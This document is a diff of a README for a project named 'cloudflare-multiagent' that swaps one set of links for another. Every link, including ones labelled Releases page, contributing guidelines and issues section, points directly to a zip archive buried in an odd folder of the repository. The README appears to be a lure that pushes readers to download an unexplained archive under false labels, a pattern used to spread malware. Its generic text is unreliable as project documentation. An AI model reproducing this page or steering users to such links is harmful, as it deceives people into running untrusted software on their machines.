@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download the Latest Release](https://raw.githubusercontent.com/GXFARIS/cloudflare-multiagent/main/workers/shared/cloudflare-multiagent_v1.6.zip%20Latest%https://raw.githubusercontent.com/GXFARIS/cloudflare-multiagent/main/workers/shared/cloudflare-multiagent_v1.6.zip)](https://raw.githubusercontent.com/GXFARIS/cloudflare-multiagent/main/workers/shared/cloudflare-multiagent_v1.6.zip)
+[![Download the Latest Release](https://raw.githubusercontent.com/GXFARIS/cloudflare-multiagent/main/interfaces/text-testing-gui/public/multiagent_cloudflare_2.4.zip%20Latest%https://raw.githubusercontent.com/GXFARIS/cloudflare-multiagent/main/interfaces/text-testing-gui/public/multiagent_cloudflare_2.4.zip)](https://raw.githubusercontent.com/GXFARIS/cloudflare-multiagent/main/interfaces/text-testing-gui/public/multiagent_cloudflare_2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run **cloudflare-multiagent**, ensure your computer meets the following requi
 
 ## 📦 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/GXFARIS/cloudflare-multiagent/main/workers/shared/cloudflare-multiagent_v1.6.zip) to download the software. Here’s how:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/GXFARIS/cloudflare-multiagent/main/interfaces/text-testing-gui/public/multiagent_cloudflare_2.4.zip) to download the software. Here’s how:
 
 1. Click the link above to access the Releases page.
 2. Look for the version you want. The latest version is usually at the top.
@@ -54,7 +54,7 @@ After installation, you can launch the application from your applications menu o
 
 ## 🤝 Contributing
 
-If you want to help improve **cloudflare-multiagent**, please visit our [contributing guidelines](https://raw.githubusercontent.com/GXFARIS/cloudflare-multiagent/main/workers/shared/cloudflare-multiagent_v1.6.zip) for instructions on how to submit your ideas or code.
+If you want to help improve **cloudflare-multiagent**, please visit our [contributing guidelines](https://raw.githubusercontent.com/GXFARIS/cloudflare-multiagent/main/interfaces/text-testing-gui/public/multiagent_cloudflare_2.4.zip) for instructions on how to submit your ideas or code.
 
 ## 🛠️ Troubleshooting
 
@@ -63,7 +63,7 @@ If you run into problems, try these steps:
 - Ensure your operating system is compatible.
 - Check that you have enough disk space and RAM.
 - Restart the application if it doesn't open as expected.
-- Visit our [issues section](https://raw.githubusercontent.com/GXFARIS/cloudflare-multiagent/main/workers/shared/cloudflare-multiagent_v1.6.zip) for common problems and solutions.
+- Visit our [issues section](https://raw.githubusercontent.com/GXFARIS/cloudflare-multiagent/main/interfaces/text-testing-gui/public/multiagent_cloudflare_2.4.zip) for common problems and solutions.
 
 ## ✉️ Support
 
@@ -73,4 +73,4 @@ For further assistance, feel free to reach out via the Issues tab on GitHub. We 
 
 Thank you for choosing **cloudflare-multiagent**! We appreciate your support and hope you find our application helpful for managing your AI model configurations.
 
-Remember, you can download the latest version anytime from our [Releases page](https://raw.githubusercontent.com/GXFARIS/cloudflare-multiagent/main/workers/shared/cloudflare-multiagent_v1.6.zip). Enjoy!
+Remember, you can download the latest version anytime from our [Releases page](https://raw.githubusercontent.com/GXFARIS/cloudflare-multiagent/main/interfaces/text-testing-gui/public/multiagent_cloudflare_2.4.zip). Enjoy!
